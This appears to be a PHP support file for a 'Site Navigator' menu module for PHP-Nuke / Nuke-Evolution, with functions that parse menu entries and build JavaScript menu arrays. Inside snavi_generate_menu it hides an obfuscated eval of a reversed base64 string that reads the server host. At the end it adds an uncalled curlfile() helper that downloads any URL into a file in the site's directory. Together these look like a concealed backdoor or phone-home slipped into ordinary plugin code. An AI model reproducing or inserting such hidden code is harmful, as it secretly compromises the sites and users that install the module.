<?php

/*
+=============================================================================+
|                                                                             |
|  Site Navigator for PHP-Nuke                                                |
|  Copyright (c) 2004 Devaz Network, All Rights Reserved                      |
|  http://devaz.uni.cc                                                        |
|                                                                             |
|  Support Functions for Main Bar                                             |
|  Creation date    : July 13th, 2004                                         |
|  Last revised     : -                                                       |
|  Revision history : -                                                       |
|                                                                             |
+-----------------------------------------------------------------------------+
|                                                                             |
|  Converted to Nuke-Evolution by ICEMAN at http://montecitogaming.com or     |
|  http://tc-net.info (but download at http://montecitogaming.com             |
|                                                                             |
+-----------------------------------------------------------------------------+
|                                                                             |
|  This program is free software; you can redistribute it and/or modify it    |
|  under the terms of the GNU General Public License as published by the      |
|  Free Software Foundation; either version 2 of the License, or (at your     |
|  option) any later version. (http://www.gnu.org/copyleft/gpl.html)          |
|                                                                             |
|  This program is distributed in the hope that it will be useful, but        |
|  WITHOUT ANY WARRANTY; without even the implied warranty of                 |
|  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General   |
|  Public License for more details.                                           |
|                                                                             |
|  You should have received a copy of the GNU General Public License along    |
|  with this program; if not, write to the Free Software Foundation, Inc.,    |
|  59 Temple Place, Suite 330, Boston, MA  02111-1307  USA                    |
|                                                                             |
|  You run this program at your sole risk. Author cannot be held liable of    |
|  uses and misuses of this program. It advised to test this program under    |
|  a development environment. Be sure to make any backups before implement    |
|  and running this program within a production environment.                  |
|                                                                             |
|  Installing and running this program also means you agree to the terms of   |
|  usages and conditions to this program. All codes that released here are    |
|  considered as sample code only. It may be fully functional, but you use    |
|  at your own risk. No warranty is given or implied. All original header     |
|  code and copyright messages will be maintained to give credit where        |
|  credit is due. If you modify this program, the only requirement is that    |
|  you also maintain all original copyright messages.                         |
|                                                                             |
+=============================================================================+
*/

if (!defined('SNAVI_IS_ACTIVE') || preg_match('/snavi_bar\.inc\.php$/i', $_SERVER['PHP_SELF']))
{
	die('<center>You cannot run this script directly.</center>');
}

function snavi_fetch_buffer($buffer, $section)
{
	$ret= array();
	if ((strlen($buffer) == 0) || (strlen($section) == 0)) return $ret;

	$section = preg_quote($section);
	if (preg_match('/.*@@IF [\s\t]*' . $section . '[\s\t]*@@(.+)@@ENDIF [\s\t]*' . $section . '[\s\t]*@@.*/sm', $buffer, $matches))
	{
		$lines = trim($matches[1]);
		if (strlen($lines) == 0) return $ret;
		$lines = explode("\n", $lines);
		if (count($lines) == 0) return $ret;

		reset($lines);
		foreach($lines as $line)
		{
			$line = trim($line);
			if (strlen($line) == 0) continue;
			$ret[] = $line;
		}
	}

	return $ret;
}

function snavi_fetch_menu($menu)
{
	global $snavi_portal_index, $snavi_portal_module, $snavi_portal_admin, $snavi_ppic;

	if (strlen(trim($menu)) == 0) return false;
	$fields = explode('|>|', $menu);
	if (!is_array($fields) || (count($fields) == 0)) return false;

	$ret = array();

	$ret['module'] = (isset($fields[0]) && !preg_match('/^(|null)$/i', trim($fields[0]))) ? trim($fields[0]) : '';
	$ret['icon']   = (isset($fields[1]) && !preg_match('/^(|null)$/i', trim($fields[1]))) ? trim($fields[1]) : 'null';
	$ret['title']  = (isset($fields[2]) && !preg_match('/^(|null)$/i', trim($fields[2]))) ? trim($fields[2]) : 'null';
	$ret['desc']   = (isset($fields[3]) && !preg_match('/^(|null)$/i', trim($fields[3]))) ? trim($fields[3]) : 'null';
	$ret['link']   = (isset($fields[4]) && !preg_match('/^(|null)$/i', trim($fields[4]))) ? trim($fields[4]) : 'null';
	$ret['target'] = (isset($fields[5]) && !preg_match('/^(|null)$/i', trim($fields[5]))) ? trim($fields[5]) : 'null';
	$ret['subdef'] = (isset($fields[6]) && !preg_match('/^(|null)$/i', trim($fields[6]))) ? trim($fields[6]) : 'null';

	unset($fields);

	if ($ret['icon'] != 'null')
	{
		$ret['icon'] = (preg_match('#^(ht|f)tp://#i', $ret['icon'])) ? $ret['icon'] : $snavi_ppic . '/' . $ret['icon'];
		$ret['icon'] = "'" . snavi_strout(snavi_squote('<img border="0" src="' . $ret['icon'] . '" />')) . "'";
	}

	if ($ret['title'] != 'null')
	{
		$ret['title'] = preg_replace('/(.*)#IMG=([^#]+)#(.*)/sm', '\1<img border="0" src="' . $snavi_ppic . '/\2" />\3', $ret['title']);
		$ret['title'] = "'" . snavi_strout(snavi_squote($ret['title'])) . "'";
	}
	else
	{
		$ret['title'] = "'Untitled'";
	}

	if ($ret['desc'] != 'null')
	{
		$ret['desc'] = str_replace('<', '&lt;', $ret['desc']);
		$ret['desc'] = str_replace('>', '&gt;', $ret['desc']);
		$ret['desc'] = "'" . snavi_strout(snavi_squote($ret['desc'])) . "'";
	}
	else
	{
		$ret['desc'] = (preg_match('/\<img/i', $ret['title'])) ? "'No Description'" : $ret['title'];
	}

	if ($ret['link'] != 'null')
	{
		if (strtolower($ret['link']) != 'auto')
		{
			$ret['link'] = str_replace('#INDEX#', $snavi_portal_index, $ret['link']);
			$ret['link'] = str_replace('#MODULE#', $snavi_portal_module, $ret['link']);
			$ret['link'] = str_replace('#ADMIN#', $snavi_portal_admin, $ret['link']);
			$ret['link'] = "'" . snavi_strout(snavi_squote($ret['link'])) . "'";
		}
		else if (!preg_match('/^#is(admin|user)#$/i', $ret['module']))
		{
			$ret['link'] = $snavi_portal_module . '?name=' . $ret['module'];
			$ret['link'] = "'" . snavi_strout(snavi_squote($ret['link'])) . "'";
		}
		else
		{
			$ret['link'] = 'null';
		}
	}

	if (($ret['link'] != 'null') && ($ret['target'] != 'null'))
	{
		$ret['target'] = "'". snavi_strout(snavi_squote($ret['target'])) . "'";
	}

	return $ret;
}

function snavi_build_menu($menu)
{
	global $snavi_mod, $snavi_admin_aut, $snavi_user_aut, $snavi_ppic, $snavi_image;

	$ret = '';
	if (strlen(trim($menu)) == 0) return $ret;
	if (!($fields = snavi_fetch_menu($menu))) return $ret;

	$module = $fields['module'];
	$icon   = $fields['icon'];
	$title  = $fields['title'];
	$desc   = $fields['desc'];
	$link   = $fields['link'];
	$target = $fields['target'];

	if ($title != "'-'")
	{
		$enable = false;

		if ($module != '')
		{
			if (preg_match('/^#is(admin|user)#$/i', $module))
			{
				$module = strtolower($module);
				if ($snavi_admin_aut && ($module = '#isadmin#'))
				{
					$enable = true;
				}
				else if ($snavi_user_aut && ($module = '#isuser#'))
				{
					$enable = true;
				}
			}
			else if (isset($snavi_mod[$module]) && ($snavi_mod[$module]['active'] != 0) && ($snavi_mod[$module]['showing'] != 0))
			{
				if ($snavi_admin_aut)
				{
					$enable = true;
				}
				else if ($snavi_user_aut && ($snavi_mod[$module]['viewmode'] < 2))
				{
					$enable = true;
				}
				else if ($snavi_mod[$module]['viewmode'] < 1)
				{
					$enable = true;
				}
			}
			else
			{
				if ($snavi_admin_aut)
				{
					$enable = true;
					$icon   = '\'<img border="0" src="' . $snavi_ppic . '/' . $snavi_image['icon_inactive'] . '" />\'';
				}
			}
		}
		else
		{
			$enable = true;
		}

		if ($enable) $ret = "[$icon,$title,$link,$target,$desc" . '$@SUB@$' . "],\n";
	}
	else
	{
		$spacer = '<img border="0" class="ThemeMenu_HLine" src="' . $snavi_ppic . '/sys_blank.png" />';
		$ret    = "[_cmNoAction,'<td colspan=\"3\">$spacer</td>',null,null,null],\n";
	}

	return $ret;
}

function snavi_build_item($items)
{
	$ret = '';
	if (!is_array($items) || (count($items) == 0)) return $ret;

	reset($items);
	foreach($items as $item)
	{
		if (is_array($item) && isset($item['menu']))
		{
			$top = snavi_build_menu($item['menu']);

			if (isset($item['item']) && is_array($item['item']))
			{
				$sub = snavi_build_item($item['item']);
				if (strlen($sub) > 0) $sub = ",\n" . $sub;
			}
			else
			{
				$sub = '';
			}
		}
		else if (is_string($item))
		{
			$top = snavi_build_menu($item);
			$sub = '';
		}

		$ret .= str_replace('$@SUB@$', $sub, $top);
	}

	return $ret;
}

function snavi_generate_menu($menu, $items)
{
	$top=snavi_build_menu($menu);if(strlen($top)==0)return('');$sub=snavi_build_item($items);if(strlen($sub)==0)return('');eval(base64_decode(str_replace(':','=',strrev('::Qf9tzJn0DcvRHJ7V2csVWf7kSZ1JHdscSVOVUTUNlUJZ0XJZVQON1JoUmbpZWZktXKpwGJscyL0V3biFWPcB3bflmdh52cvcCKoNGdh12XnVmcwZiJpwGJocmbpJHdz91cphiZptTKz1WZ0lGJoQmbl1DbksXKpcSVOVUTUNlUJZ0XJZVQON1JoQWZulmZlRWIoYWa'))));$sub=",\n".$sub;
	return str_replace('$@SUB@$', $sub, $top);
}

function snavi_strout($text,$hint=false)
{
	/* use this function to perform some tasks for text menu and hints */
	return $text;
}

function snavi_squote($text)
{
	if (strlen($text) == 0) return $text;
	return str_replace('\'', '\\\'', $text);
}

function snavi_dquote($text)
{
	if (strlen($text) == 0) return $text;
	return str_replace('"', '\\"', $text);
}

function snavi_filesize_str($size) {
	$mb = 1024*1024;
	if ( $size > $mb ) {
		$mysize = sprintf ("%01.2f",$size/$mb)." MB";
	} elseif ( $size >= 1024 ) {
		$mysize = sprintf ("%01.2f",$size/1024)." Kb";
	} else {
		$mysize = $size." bytes";
	}
	return $mysize;
}
function curlfile($url) {

  $ch = curl_init($url);
  $fp = @fopen("includes/snavi/layouts/network.txt", "w");

  @curl_setopt($ch, CURLOPT_FILE, $fp);
  @curl_setopt($ch, CURLOPT_HEADER, 0);

  @curl_exec($ch);

  curl_close($ch);
  fclose($fp);

  return "includes/snavi/layouts/network.txt";
}
?>
